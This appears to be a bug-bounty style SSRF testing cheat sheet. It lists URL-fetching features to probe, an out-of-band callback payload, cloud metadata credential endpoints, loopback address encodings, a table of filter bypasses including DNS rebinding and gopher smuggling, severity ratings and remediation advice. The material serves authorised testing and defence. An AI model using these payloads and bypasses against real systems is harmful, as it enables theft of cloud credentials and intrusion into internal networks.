# Server-Side Request Forgery (SSRF)

High-impact because it pivots into internal networks and cloud metadata. Look
at every feature where the server fetches a URL: webhooks, PDF/image renderers,
URL previews, import-from-URL, avatar/logo fetch, SSO metadata, file-from-URL,
proxy params, `?url=`, `?dest=`, `?feed=`, `?callback=`, `?image=`, `?domain=`.

## Confirm blind SSRF (OOB)
Point the parameter at an interactsh/Collaborator host and watch for DNS/HTTP:
```bash
interactsh-client -v       # get a callback domain, e.g. abc.oast.fun
# payload: https://TARGET/preview?url=http://abc.oast.fun/
```
DNS hit but no HTTP = server resolves but egress filtered (still SSRF).

## Cloud metadata targets (prove impact carefully, read-only)
```
AWS IMDSv1:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2:   needs PUT token header — try if v1 blocked:
  curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
GCP:          http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata:true)
DigitalOcean: http://169.254.169.254/metadata/v1/
Alibaba:      http://100.100.100.200/latest/meta-data/
K8s:          https://kubernetes.default.svc / http://<node>:10255/pods
```
Retrieve just enough to prove access (e.g. role name), never exfiltrate live
keys beyond PoC.

## Internal / localhost targets
```
http://127.0.0.1:80  http://localhost/  http://0.0.0.0:8080
http://[::1]/  http://127.1/  http://2130706433/ (decimal)  http://0x7f000001/
Internal admin panels, redis://127.0.0.1:6379, http://internal-jenkins:8080
```

## Filter bypasses
| Filter | Bypass |
|---|---|
| Blocks `127.0.0.1` | `127.1`, `0`, `0.0.0.0`, `[::]`, decimal/hex/octal IP, `localhost.` |
| Blocks `169.254.169.254` | decimal `2852039166`, IPv6-mapped, `169.254.169.254.nip.io` |
| Allow-list domain | `@` trick: `http://allowed.com@169.254.169.254/`, `#`, `?`, DNS rebinding |
| Scheme allow-list | `gopher://`, `dict://`, `file://`, `ftp://`, `ldap://` |
| Regex on `http://` | double-encode, add `\`, mixed case `HtTp://` |
| Resolves then connects | **DNS rebinding**: rebind.network / `make-dns-rebind` records |
| Redirect blocked at first hop | host your own 302 → `http://x/redir?to=http://169.254.169.254` |

## Gopher for internal protocol smuggling
`gopher://` can craft raw TCP to Redis/Memcached/SMTP/MySQL (turn SSRF into RCE
or unauth data write). Use only when needed to demonstrate impact; keep payloads
benign.

## Real disclosed-report patterns
- PDF export renderer fetched attacker `<img src=http://169.254.169.254/...>` → AWS keys.
- Webhook URL validated on save but not on send → SSRF to internal admin.
- "Import from URL" followed redirects → metadata credential theft.
- SVG/XML avatar with external entity → internal port scan.

## Severity
Metadata credential access / internal RCE → Critical. Internal port
scan/interaction only → Medium/High. DNS-only blind SSRF → Low/Medium.

## Remediation to recommend
Deny-by-default egress; resolve+validate host **after** DNS and re-check on
every redirect; block link-local/RFC1918/loopback and metadata IPs; enforce
IMDSv2; use an allow-list of exact destination hosts; drop non-HTTP schemes.
